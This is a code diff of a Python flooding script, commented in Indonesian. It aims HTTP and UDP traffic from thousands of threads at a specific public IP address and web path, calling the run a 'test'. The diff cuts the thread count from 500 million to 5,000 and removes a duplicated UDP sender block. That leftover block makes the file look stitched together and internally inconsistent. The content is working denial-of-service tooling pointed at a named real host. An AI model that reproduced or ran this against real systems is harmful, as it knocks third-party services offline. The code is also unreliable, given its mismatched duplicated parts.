@@ -13,7 +13,7 @@ import socket, threading, time, ipaddress, sys
 TARGET_IP    = "139.99.61.184"   # target server
 TARGET_PORT  = 80
 PATH         = "/~bansosrz7/"
-THREADS      = 500000000                 # jumlah thread paralel
+THREADS      = 5000                 # jumlah thread paralel
 DURATION_SEC = 20                # lama pengujian
 TIMEOUT_S    = 10
 
@@ -111,75 +111,6 @@ def main():
         total_err = sum(err_count)
         total_bytes = sum(bytes_count)
         print(f"Done. OK={total_ok} ERR={total_err} Bytes={total_bytes} ({total_bytes*8/1e6:.2f} Mbit)")
-
-if __name__ == "__main__":
-    main()
-            try:
-                s.sendto(payload, (TARGET_IP, TARGET_PORT))
-                with locks[idx]:
-                    bytes_sent[idx] += PACKET_SIZE
-                    pkts_sent[idx]  += 1
-                tokens -= PACKET_SIZE
-            except Exception as e:
-                print(f"[Thread-{idx+1}] error: {e}")
-                break
-        else:
-            time.sleep(0.001)  # hindari busy loop
-    try:
-        s.close()
-    except Exception:
-        pass
-
-def reporter(end_ts: float):
-    last = time.perf_counter()
-    prev_total = 0
-    while not stop_flag.is_set():
-        now = time.perf_counter()
-        if now - last >= 1.0:
-            last = now
-            with_sum = sum(bytes_sent)
-            inst_bytes = with_sum - prev_total
-            prev_total = with_sum
-            mbps = (inst_bytes * 8) / 1e6
-            cum_MB = with_sum / 1e6
-            ts = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
-            print(f"{ts} | OUT: {mbps:7.2f} Mbps | total: {cum_MB:,.2f} MB")
-        if time.time() >= end_ts:
-            break
-        time.sleep(0.05)
-
-def main():
-    ensure_allowed(TARGET_IP)
-
-    print(f"Safe UDP sender -> {TARGET_IP}:{TARGET_PORT}")
-    print(f"Threads={THREADS} | rate={MBPS_TOTAL} Mbit/s | duration={DURATION_SEC}s "
-          f"| pkt={PACKET_SIZE}B | TTL={TTL_HOPS}")
-
-    per_thread_bps = (MBPS_TOTAL * 1e6) / THREADS
-    end_ts = time.time() + DURATION_SEC
-
-    rep = threading.Thread(target=reporter, args=(end_ts,), daemon=True)
-    rep.start()
-
-    threads = []
-    for i in range(THREADS):
-        t = threading.Thread(target=sender_thread, args=(i, per_thread_bps, end_ts), daemon=True)
-        t.start()
-        threads.append(t)
-
-    try:
-        while time.time() < end_ts:
-            time.sleep(0.2)
-    except KeyboardInterrupt:
-        print("\nStopping early...")
-    finally:
-        stop_flag.set()
-        for t in threads:
-            t.join(timeout=1.0)
-        total_bytes = sum(bytes_sent)
-        total_pkts  = sum(pkts_sent)
-        print(f"Done. Sent {total_pkts} packets, {total_bytes/1e6:.2f} MB "
-              f"({total_bytes*8/1e6:.2f} Mbit).")
 
 if __name__ == "__main__":
     main()
